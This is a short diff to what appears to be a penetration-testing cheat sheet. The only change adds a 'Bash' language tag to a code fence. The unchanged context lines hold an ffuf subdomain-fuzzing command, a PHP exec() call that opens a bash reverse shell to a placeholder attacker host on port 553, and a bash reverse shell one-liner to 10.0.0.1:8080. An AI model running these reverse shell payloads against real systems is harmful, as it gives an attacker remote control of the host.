@@ -155,7 +155,7 @@ ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1m
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
 ?>
 ```
-```
+```Bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
